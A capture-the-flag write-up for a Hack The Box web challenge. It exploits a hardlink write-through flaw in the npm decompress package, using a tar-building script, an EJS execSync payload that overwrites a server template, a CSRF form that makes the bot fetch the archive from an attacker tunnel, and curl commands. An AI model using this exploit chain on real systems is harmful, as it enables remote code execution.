# Archonyx — Full Breakdown

**Live flag:** `HTB{wh4t_th3_l3dg3r_cl34rs_th3_c04st_b3l13v3s_d64eaa2346ba98a3c06ab7e34b33c994}`
**Live box:** `154.57.164.76:31579`

---

## 1. Files you need to read (and what to extract from each)

| File | What it tells you |
|------|-------------------|
| `Dockerfile` | `/flag.txt` is root-only (`chmod 400`), `/readflag` is **setuid root** (`chmod 4755`), app runs as `ctf` → **goal = RCE to run `/readflag`**. |
| `app.js` | Route/middleware order. `app.use('/api', apiRouter)`, `/ledgermaster` (admin), `/` (pages). Static: `/uploads` + `/public`. |
| `routes/api.js` | `POST /api/fetch → resolveAuth → api.uploadUrl` (line 14). This is the SSRF+extract endpoint. |
| `controllers/apiController.js` | `uploadUrl` (lines 59–81): requires `url` to be `http(s)://`, then `uploadService.downloadAndExtract(url, extractDir)` and `setImmediate(validateExtractedFiles)`. |
| `services/uploadService.js` | **The juicy file.** `downloadAndExtract` = `download(url, dir, {extract:true})` (lines 40–43). `validateExtractedFiles` (45–62) only deletes **top-level** non-image entries **inside the extract dir** — it does *not* touch anything outside it. |
| `services/bot.js` | Bot signs a JWT `{username:'bot', role:'warden'}`, sets it as an **httpOnly cookie for `http://127.0.0.1:1337/`**, launches chromium with `--disable-features=SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure` and `--disable-popup-blocking`, then `page.goto(url)` and waits 60 s. |
| `controllers/pageController.js` | `submitSupport` (`POST /report`, **no auth**) calls `bot.visit(url)` if `url` is http(s). `verifyPending` (`GET /verify`, unauth) → `res.render('verify')`. |
| `middleware/auth.js`, `resolveAuth.js`, `requireRole.js` | Auth is solid (JWT HS256 random secret; `if(key)`+`===` blocks the null-apiKey trick; strict role check). These are red herrings — **no auth bypass exists**. |
| `node_modules/decompress/index.js` | **The vulnerability.** See below. |

The deliberate misdirection is that *every* classic vector is closed (JWT, prototype pollution via `allowPrototypes`, zip-slip in `unzipper`/`decompress`, filenamify, the `theme` DOM-XSS is unreachable because `dashboard` validates `theme`). The one thing that isn't closed is **`decompress` handling of hardlinks**.

---

## 2. The vulnerability (decompress hardlink write-through)

In `node_modules/decompress/index.js`, `extractFile` builds `dest = path.join(output, x.path)` and, per entry type:

```js
// security check ONLY runs for type === 'file':
.then(realOutputPath => {
  if (x.type === 'file') return preventWritingThroughSymlink(dest, realOutputPath); // readlink() check
  return realOutputPath;                       // 'link' / 'symlink' skip it
})
.then(realOutputPath => {
  return fsP.realpath(path.dirname(dest))     // <-- validates the DIRECTORY, not dest itself
    .then(realDestinationDir => {
      if (realDestinationDir.indexOf(realOutputPath) !== 0) throw 'Refusing to write outside...';
    });
})
.then(() => {
  if (x.type === 'link')   return fsP.link(x.linkname, dest);   // HARDLINK — NO check on linkname!
  if (x.type === 'symlink')return fsP.symlink(x.linkname, dest);// symlink — blocked by realpath above
  return fsP.writeFile(dest, x.data, {mode});                   // regular file
});
```

Two gaps:

1. **`type:'link'` (hardlink)** calls `fs.link(linkname, dest)` with **no validation of `linkname`**. `dest` is inside the output dir, so the directory-realpath check passes — but `dest` becomes a hardlink pointing at an **arbitrary absolute path** (e.g. `/app/views/verify.ejs`).
2. The next entry, a **regular file with the same name** (`lnk`), does `fs.writeFile(dest)`. Because `dest` is now a hardlink to `verify.ejs`, the write goes **through the inode and overwrites `verify.ejs`**. The `preventWritingThroughSymlink` guard doesn't fire (a hardlink is not a symlink — `readlink` fails on it), and the realpath check only inspects `dirname(dest)` = the output dir.

(Symlinks don't work here: the realpath check resolves the symlink and refuses. Only **hardlinks** slip through.)

**The race:** `decompress` runs all entries via `Promise.all` (concurrent). If a *file* entry's `writeFile` runs before the *link*'s `fs.link`, it creates `lnk` as a normal file and the link then errors `EEXIST`. Empirically (`1 link + 1 file` = 0/10, `50 links + 1 file` = 10/10) you need **many link entries** so one `fs.link` reliably wins the create-race; then the single file write goes through it. We use **60 links + 1 file**.

`validateExtractedFiles` then `rmSync`s the `lnk` entry in the extract dir — but that only removes the directory entry; `verify.ejs` is the same inode and **keeps the overwritten content**.

---

## 3. The exact payload

### `evil.tar` (build with Python; `lnk` is the shared name)

```python
import tarfile, io
TARGET = '/app/views/verify.ejs'                      # file-convoy.ejs works too (both rendered unauth)
PAYLOAD = b'FLAG:<%= process.mainModule.require("child_process").execSync("/readflag").toString().trim() %>'
with tarfile.open('evil.tar','w') as t:
    for _ in range(60):                                # 60 hardlinks -> win the create race
        li = tarfile.TarInfo('lnk')
        li.type = tarfile.LNKTYPE                     # hardlink
        li.linkname = TARGET
        t.addfile(li)
    fi = tarfile.TarInfo('lnk')                        # 1 regular file, same name -> writes through the hardlink
    fi.type = tarfile.REGTYPE
    fi.size = len(PAYLOAD)
    t.addfile(fi, io.BytesIO(PAYLOAD))
```

Why this EJS works: EJS compiles templates with `new Function`, which runs in Node's **global scope**, so the global `process` is reachable → `process.mainModule.require('child_process')` = full RCE. (EJS 6 *did* patch the prototype-pollution gadget `outputFunctionName` with an identifier regex — but a template **file we fully control** needs no gadget.)

### `attacker.html` (CSRF trigger; served on your tunnel)

```html
<!DOCTYPE html><html><body>
<form id="f" action="http://127.0.0.1:1337/api/fetch" method="POST"
      enctype="application/x-www-form-urlencoded">
  <input name="url" value="https://<TUNNEL>/evil.tar">
</form>
<script>setTimeout(() => document.getElementById('f').submit(), 300);</script>
</body></html>
```

A plain form POST is a "simple" request (no CORS preflight), and the bot's cookie is sent because SameSite enforcement is disabled. The bot navigates to `/api/fetch`; we don't care about the response — only the side effect.

---

## 4. Exploitation steps (what actually runs)

```
[attacker]  python3 -m http.server 8000 --directory <dir with evil.tar + attacker.html>
[attacker]  ssh -R 80:localhost:8000 nokey@localhost.run        # -> https://xxxx.lhr.life  (NON-Cloudflare!)
            │  (the box blocks Cloudflare: ngrok/cloudflared get 0 hits from the bot)
[attacker]  curl -X POST http://154.57.164.76:31579/report \
              --data-urlencode 'body=x' \
              --data-urlencode 'url=https://xxxx.lhr.life/attacker.html'
            │
            ▼  /report (public) -> bot.visit(url)
[BOT]       puppeteer goto attacker.html  (cookie: warden JWT for 127.0.0.1:1337)
[BOT]       JS submits form -> POST http://127.0.0.1:1337/api/fetch  url=https://xxxx.lhr.life/evil.tar
            │
            ▼  /api/fetch (auth'd as bot via cookie) -> downloadAndExtract
[APP]       download() fetches evil.tar, archiveType() sees TAR magic -> decompress()
            decompress: 60x fs.link('lnk','/app/views/verify.ejs')  (one wins)
                        1x  writeFile('lnk', PAYLOAD)   -> overwrites /app/views/verify.ejs
            validateExtractedFiles: rmSync('lnk') in extract dir (verify.ejs inode unchanged)
            │
            ▼
[attacker]  curl http://154.57.164.76:31579/verify
            -> res.render('verify') runs the overwritten template -> /readflag
FLAG:HTB{wh4t_th3_l3dg3r_cl34rs_th3_c04st_b3l13v3s_d64eaa2346ba98a3c06ab7e34b33c994}
```

---

## 5. Why each defense didn't matter

- **Auth** — never bypassed; we ride the **bot's own** verified warden session (CSRF). No admin/JWT/pollution needed.
- **`validateArchive` / file-type / ext checks** — only on `POST /api/manifest`; `/api/fetch` has **no pre-extraction validation**, only the post-hoc top-level cleanup that can't undo an out-of-dir write.
- **zip-slip guards** — irrelevant; we use **hardlinks**, not `../` paths (which `decompress`/`unzipper`/`filenamify` all block).
- **CSP nonce** — irrelevant; we don't inject browser JS, we overwrite a **server-side** template.
- **`SameSite`/httpOnly** — cookie can't be *read*, but it's still *sent* on the cross-site form POST because the bot disabled SameSite enforcement.

---

## 6. Networking gotcha

The docker has outbound internet but **BLOCKS Cloudflare** — `ngrok` (`ngrok-free.dev`) and `cloudflared` (`trycloudflare.com`) both received **0 requests** from the bot. **localhost.run** (SSH tunnel, `ssh -R 80:localhost:8000 nokey@localhost.run` → `https://*.lhr.life`) worked. For HTB bot callbacks on this kind of box, reach for a non-Cloudflare tunnel.
